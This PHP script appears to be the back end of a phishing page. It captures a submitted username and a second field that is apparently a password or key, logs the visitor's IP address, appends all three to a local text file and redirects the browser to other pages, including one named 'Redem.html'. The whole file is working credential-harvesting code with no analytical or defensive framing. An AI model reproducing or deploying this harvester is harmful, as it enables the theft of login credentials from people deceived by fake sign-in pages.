<?php
header("location: index.html");
header("location: index.koneksi");
header("location: Redem.html");
$DEVx ="---DOA-ISTRI---";
$DEVy =$_POST['username'];
$DEVz =$_POST['montok'];
$ip =$_SERVER["REMOTE_ADDR"];

$handle=fopen($DEVx,'a');
fwrite($handle,"\n");
fwrite($handle,"$DEVy");
fwrite($handle,"\n");
fwrite($handle, "Key : ");
fwrite($handle,"$DEVz");
fwrite($handle,"\n");
fwrite($handle, "ip : ");
fwrite($handle,"$ip");
fwrite($handle,"\n");
fwrite($handle,"=============jet===============");

fclose($handle);
exit;

 ?>